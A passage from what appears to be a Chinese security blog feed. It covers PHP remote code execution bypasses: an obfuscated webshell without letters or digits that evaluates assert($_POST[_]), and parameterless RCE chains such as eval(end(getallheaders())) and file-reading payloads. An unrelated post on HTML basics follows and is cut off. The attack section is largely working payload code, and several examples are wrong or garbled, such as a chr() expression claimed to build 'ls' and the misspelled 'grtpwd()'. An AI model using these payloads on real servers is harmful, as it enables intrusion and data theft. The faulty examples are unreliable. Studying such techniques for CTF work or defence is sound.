class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过14次自增，$__ = &#x27;O&#x27;</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;        <span class="comment">// $____ = &#x27;_PO&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过18次自增，$__ = &#x27;S&#x27;</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;        <span class="comment">// $____ = &#x27;_POS&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过19次自增，$__ = &#x27;T&#x27;</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;        <span class="comment">// $____ = &#x27;_POST&#x27;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;         <span class="comment">// $_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);       <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>使用时配合POST参数：<code>_=phpinfo();</code>即可执行任意PHP代码7。</p><p>优缺点:</p><p>优点：</p><ul><li>完全不依赖字母和数字字符</li><li>在严格过滤环境下仍能工作</li><li>可以构建任意函数名和参数</li></ul><p>缺点：</p><ul><li>Payload通常较长且复杂</li><li>需要PHP环境支持字符串自增行为</li><li>对PHP版本有一定要求(某些版本行为可能不同)</li></ul><h2 id="二、无参数RCE"><a href="#二、无参数RCE" class="headerlink" title="二、无参数RCE"></a>二、无参数RCE</h2><p>无参RCE是一种特殊的代码执行漏洞，攻击者可以在不直接传递参数的情况下，通过构造特定的<strong>函数调用链</strong>来实现远程代码执行。以下是关于PHP无参RCE的详细介绍：</p><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>PHP无参RCE的成因主要与以下几个方面有关：</p><ol><li><p><strong>代码逻辑缺陷</strong>：某些PHP代码可能会对用户输入进行不安全的处理，例如使用<code>eval()</code>函数直接执行用户输入的代码，而没有对输入进行严格的过滤</p></li><li><p><strong>正则表达式绕过</strong>：某些情况下，开发者可能会使用正则表达式来过滤用户输入，但攻击者可以通过构造特定的函数调用链来绕过这些过滤</p></li><li><p><strong>PHP函数特性</strong>：PHP中存在一些无参数的函数或可以通过特定方式构造参数的函数，这些函数可以被攻击者利用</p></li></ol><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>利用PHP无参RCE的关键在于<strong>构造无参数的函数调用链</strong>，以实现代码执行。以下是一些常见的利用方式：</p><ol><li><p><strong>利用无参数函数</strong>：</p><ul><li><code>scandir()</code>：获取当前目录下的文件列表</li><li><code>localeconv()</code>：返回包含本地数字及货币格式信息的数组，可以用于构造特定的字符</li><li><code>current()</code>、<code>pos()</code>：获取数组的第一个值</li><li><code>array_rand()</code>、<code>array_reverse()</code>：操作数组以获取特定值</li></ul></li><li><p><strong>构造文件路径</strong>：</p><ul><li>通过<code>getcwd()</code>、<code>dirname()</code>等函数构造文件路径，结合<code>scandir()</code>获取目标文件</li></ul></li><li><p><strong>读取文件内容</strong>：</p><ul><li>利用<code>highlight_file()</code>、<code>show_source()</code>、<code>readfile()</code>等函数读取文件内容</li></ul></li><li><p><strong>命令执行</strong>：</p><ul><li>使用<code>eval()</code>、<code>assert()</code>等函数执行代码</li></ul></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以下是一个典型的无参RCE场景：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者可以通过构造类似以下的<code>exp</code>参数来绕过过滤并执行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><p>通过<code>current(localeconv())</code>构造小数点，进而调用<code>scandir()</code>获取当前目录下的文件列表</p><h3 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h3><blockquote><p><strong>附：PHP官方文档的函数介绍：<a href="https://www.php.net/manual/zh/indexes.functions.php">https://www.php.net/manual/zh/indexes.functions.php</a></strong></p></blockquote><p><strong>一、HTTP相关函数</strong></p><h4 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1. getallheaders()"></a>1. getallheaders()</h4><ul><li><strong>功能</strong>：获取所有HTTP请求头，返回关联数组</li><li><strong>利用</strong>：从请求头中获取可控数据</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：获取User-Agent头</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>()); <span class="comment">// 获取最后一个头</span></span><br></pre></td></tr></table></figure><h4 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2. get_defined_vars()"></a>2. get_defined_vars()</h4><ul><li><strong>功能</strong>：返回所有已定义变量的多维数组</li><li><strong>利用</strong>：获取GET/GET/_POST等超全局变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())); <span class="comment">// 获取第一个变量</span></span><br></pre></td></tr></table></figure><p><strong>二、会话控制函数</strong></p><h4 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3. session_id()"></a>3. session_id()</h4><ul><li><strong>功能</strong>：获取/设置当前会话ID</li><li><strong>利用</strong>：通过设置恶意session ID执行代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_id</span>(<span class="string">&#x27;evilcode&#x27;</span>); </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br></pre></td></tr></table></figure><h4 id="4-session-start"><a href="#4-session-start" class="headerlink" title="4. session_start()"></a>4. session_start()</h4><ul><li><strong>功能</strong>：启动新会话或重用现有会话</li><li><strong>利用</strong>：配合session_id()使用</li></ul><p><strong>三、本地化函数</strong></p><h4 id="5-localeconv"><a href="#5-localeconv" class="headerlink" title="5. localeconv()"></a>5. localeconv()</h4><ul><li><strong>功能</strong>：返回本地化数字格式信息</li><li><strong>关键利用</strong>：返回的数组第一个元素是小数点(.)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()); <span class="comment">// 得到点字符&quot;.&quot;</span></span><br></pre></td></tr></table></figure><p><strong>四、文件系统函数</strong></p><h4 id="6-scandir"><a href="#6-scandir" class="headerlink" title="6. scandir()"></a>6. scandir()</h4><ul><li><strong>功能</strong>：列出目录中的文件和目录</li><li><strong>利用</strong>：目录遍历核心函数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// 列出当前目录</span></span><br></pre></td></tr></table></figure><h4 id="7-chdir"><a href="#7-chdir" class="headerlink" title="7. chdir()"></a>7. chdir()</h4><ul><li><strong>功能</strong>：改变当前目录</li><li><strong>利用</strong>：配合scandir()跳转目录</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>); <span class="comment">// 跳到上级目录</span></span><br></pre></td></tr></table></figure><h4 id="8-getcwd-grtpwd"><a href="#8-getcwd-grtpwd" class="headerlink" title="8. getcwd() / grtpwd()"></a>8. getcwd() / grtpwd()</h4><ul><li><strong>功能</strong>：获取当前工作目录</li><li><strong>利用</strong>：获取路径信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getcwd</span>(); <span class="comment">// 如&quot;/var/www/html&quot;</span></span><br></pre></td></tr></table></figure><h4 id="9-dirname"><a href="#9-dirname" class="headerlink" title="9. dirname()"></a>9. dirname()</h4><ul><li><strong>功能</strong>：返回路径中的目录部分</li><li><strong>利用</strong>：目录跳转</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;/var/www&#x27;</span>); <span class="comment">// 返回&quot;/var&quot;</span></span><br></pre></td></tr></table></figure><p><strong>五、数组操作函数</strong></p><h4 id="10-current-pos"><a href="#10-current-pos" class="headerlink" title="10. current() / pos()"></a>10. current() / pos()</h4><ul><li><strong>功能</strong>：返回数组当前元素</li><li><strong>利用</strong>：获取数组第一个元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)); <span class="comment">// 第一个文件</span></span><br></pre></td></tr></table></figure><h4 id="11-array-reverse"><a href="#11-array-reverse" class="headerlink" title="11. array_reverse()"></a>11. array_reverse()</h4><ul><li><strong>功能</strong>：返回逆序数组</li><li><strong>利用</strong>：改变数组顺序</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>))); <span class="comment">// 获取第一个文件</span></span><br></pre></td></tr></table></figure><h4 id="12-array-flip"><a href="#12-array-flip" class="headerlink" title="12. array_flip()"></a>12. array_flip()</h4><ul><li><strong>功能</strong>：交换键值</li><li><strong>利用</strong>：改变数组结构</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_flip</span>([<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>]); <span class="comment">// [1=&gt;&#x27;a&#x27;,2=&gt;&#x27;b&#x27;]</span></span><br></pre></td></tr></table></figure><h4 id="13-array-rand"><a href="#13-array-rand" class="headerlink" title="13. array_rand()"></a>13. array_rand()</h4><ul><li><strong>功能</strong>：随机返回数组键名</li><li><strong>利用</strong>：随机选择文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>))];</span><br></pre></td></tr></table></figure><h4 id="14-next-prev-end"><a href="#14-next-prev-end" class="headerlink" title="14. next() / prev() / end()"></a>14. next() / prev() / end()</h4><ul><li><strong>功能</strong>：移动数组指针</li><li><strong>利用</strong>：遍历数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)); <span class="comment">// 最后一个文件</span></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)); <span class="comment">// 第二个文件</span></span><br></pre></td></tr></table></figure><p><strong>六、输出函数</strong></p><h4 id="15-print-r"><a href="#15-print-r" class="headerlink" title="15. print_r()"></a>15. print_r()</h4><ul><li><strong>功能</strong>：打印易读的变量信息</li><li><strong>利用</strong>：输出数组内容</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br></pre></td></tr></table></figure><h4 id="16-show-source-highlight-file"><a href="#16-show-source-highlight-file" class="headerlink" title="16. show_source() / highlight_file()"></a>16. show_source() / highlight_file()</h4><ul><li><strong>功能</strong>：语法高亮显示文件源码</li><li><strong>利用</strong>：读取文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)));</span><br></pre></td></tr></table></figure><h4 id="17-readfile-file-get-contents"><a href="#17-readfile-file-get-contents" class="headerlink" title="17. readfile() / file_get_contents()"></a>17. readfile() / file_get_contents()</h4><ul><li><strong>功能</strong>：读取文件内容</li><li><strong>利用</strong>：读取flag</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>七、编码转换函数</strong></p><h4 id="18-chr-ord"><a href="#18-chr-ord" class="headerlink" title="18. chr() / ord()"></a>18. chr() / ord()</h4><ul><li><strong>功能</strong>：ASCII码与字符互转</li><li><strong>利用</strong>：构造特定字符</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">65</span>); <span class="comment">// &#x27;A&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>); <span class="comment">// 65</span></span><br></pre></td></tr></table></figure><h4 id="19-hex2bin"><a href="#19-hex2bin" class="headerlink" title="19. hex2bin()"></a>19. hex2bin()</h4><ul><li><strong>功能</strong>：十六进制转二进制</li><li><strong>利用</strong>：构造字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;414243&#x27;</span>); <span class="comment">// &#x27;ABC&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="20-urldecode"><a href="#20-urldecode" class="headerlink" title="20. urldecode()"></a>20. urldecode()</h4><ul><li><strong>功能</strong>：URL解码</li><li><strong>利用</strong>：解码特殊字符</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%41&#x27;</span>); <span class="comment">// &#x27;A&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>八、数学函数</strong></p><h4 id="21-phpversion"><a href="#21-phpversion" class="headerlink" title="21. phpversion()"></a>21. phpversion()</h4><ul><li><strong>功能</strong>：获取PHP版本</li><li><strong>利用</strong>：判断环境</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>()); <span class="comment">// 主版本号</span></span><br></pre></td></tr></table></figure><h4 id="22-rand-time"><a href="#22-rand-time" class="headerlink" title="22. rand() / time()"></a>22. rand() / time()</h4><ul><li><strong>功能</strong>：随机数/时间戳</li><li><strong>利用</strong>：生成临时数据</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line"><span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure><h4 id="23-localtime"><a href="#23-localtime" class="headerlink" title="23. localtime()"></a>23. localtime()</h4><ul><li><strong>功能</strong>：返回本地时间数组</li><li><strong>利用</strong>：获取数字</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localtime</span>()[<span class="number">0</span>]; <span class="comment">// 秒数</span></span><br></pre></td></tr></table></figure><h3 id="经典利用组合"><a href="#经典利用组合" class="headerlink" title="经典利用组合"></a>经典利用组合</h3><h4 id="1-读取当前目录文件"><a href="#1-读取当前目录文件" class="headerlink" title="1. 读取当前目录文件"></a>1. 读取当前目录文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br></pre></td></tr></table></figure><h4 id="2-利用HTTP头执行代码"><a href="#2-利用HTTP头执行代码" class="headerlink" title="2. 利用HTTP头执行代码"></a>2. 利用HTTP头执行代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure><h4 id="3-构造命令执行"><a href="#3-构造命令执行" class="headerlink" title="3. 构造命令执行"></a>3. 构造命令执行</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>)+<span class="number">17</span>).<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;Q&#x27;</span>)-<span class="number">1</span>)); <span class="comment">// 构造&#x27;ls&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="4-目录遍历技巧"><a href="#4-目录遍历技巧" class="headerlink" title="4. 目录遍历技巧"></a>4. 目录遍历技巧</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>)-<span class="number">32</span>))); <span class="comment">// 扫描上级目录</span></span><br></pre></td></tr></table></figure><h4 id="5-Session-ID利用"><a href="#5-Session-ID利用" class="headerlink" title="5. Session ID利用"></a>5. Session ID利用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_id</span>(<span class="string">&#x27;&lt;?php system(&quot;ls&quot;);?&gt;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础初探</title>
      <link href="/2025/02/28/HTML%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/02/28/HTML%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML-基础语法"><a href="#HTML-基础语法" class="headerlink" title="HTML 基础语法"></a>HTML 基础语法</h1><p><strong><em>【在科学上方是没有平坦的大路可走的，只有那在崎岖小路的攀登上不畏劳苦的人，才有期望到达光辉的顶点。        ——马克思】</em></strong></p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>生成浏览器文件.html的快捷方式：<code>!</code>+<code>Enter</code></p><p>代码格式化： <code>Shift</code>+<code>Alt</code>+<code>F</code></p><p><img src="https://pic1.imgdb.cn/item/67c40d6bd0e0a243d409e19a.png" alt=""></p><h3 id="HTML5-介绍："><a href="#HTML5-介绍：" class="headerlink" title="HTML5 介绍："></a>HTML5 介绍：</h3><p>HTML5是用来描述网页的一种语言，称为超文本标记语言，用HTML5编写的文件，后缀为.html，HTML是一种标记语言，标记语言是一套标记标签，标签是由尖括号包围的关键字，例如：<code>&lt;html&gt;</code></p><p>标签有两种表现形式：</p><ol><li>双标签，例如<code>&lt;html&gt;&lt;html&gt;</code></li><li>单标签，例如<code>&lt;img&gt;</code></li></ol><h2 id="HTML5-基本骨架："><a href="#HTML5-基本骨架：" class="headerlink" title="HTML5 基本骨架："></a>HTML5 基本骨架：</h2><p><img src="https://pic1.imgdb.cn/item/67c40f08d0e0a243d409e67a.png" alt=""></p><h3 id="DOCTYPE-声明："><a href="#DOCTYPE-声明：" class="headerlink" title="DOCTYPE 声明："></a>DOCTYPE 声明：</h3><p>DOCTYPE是document type（文档类型）的缩写。<code>&lt;!DOCTYPE html&gt;</code>是H5的声明位于文档的最前面，处于标签之前。他是网页必备的组成部分，避免浏览器的怪异模式。</p><h3 id="html标签："><a href="#html标签：" class="headerlink" title="html标签："></a>html标签：</h3><p>定义HTML文档，其他元素要包裹在它里面，标签定义了文档的开始点和结束点</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="head标签："><a href="#head标签：" class="headerlink" title="head标签："></a>head标签：</h3><p>定义文档的头部，头部描述了文档的各种属性和信息，包括文档的标题，在Web中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="body标签："><a href="#body标签：" class="headerlink" title="body标签："></a>body标签：</h3><p>body元素定义文档的主体。</p><p>body元素包含文档的所有内容（例如文本，超链接，图像，表格和列表等）</p><p>它会直接在页面中显示出来，也就是用户可以直观看到的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        冰冰邦邦~</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="title标签："><a href="#title标签：" class="headerlink" title="title标签："></a>title标签：</h3><p>可定义文章的标题</p><p>它显示在浏览器窗口的标题栏或状态栏上</p><p><code>&lt;title&gt;</code>标签是<code>&lt;head&gt;</code>标签中唯一必须要求包含的东西，也就是说，写head一定要写title</p><p><code>&lt;title&gt;</code>的增加有利于SEO优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SEO是搜索引擎优化的英文缩写，通过对网站内容调整，满足搜索引擎的排名需求</span><br></pre></td></tr></table></figure><h3 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h3><p>meta标签用来描述一个HTML网页文档的属性，关键词等，例如：charset=“utf-8”是说当前使用的是utf-8编码格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>冰冰邦邦<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        冰冰邦邦！！！！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h2><h3 id="标题介绍与应用"><a href="#标题介绍与应用" class="headerlink" title="标题介绍与应用"></a>标题介绍与应用</h3><p>标题是通过<code>&lt;h1&gt;&lt;h6&gt;</code>标签进行定义的</p><p><code>&lt;h1&gt;</code>定义最大的标题，<code>&lt;h6&gt;</code>定义最小的标题</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>二级标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>三级标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>四级标题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>五级标题<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>六级标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="标题标签的位置摆放："><a href="#标题标签的位置摆放：" class="headerlink" 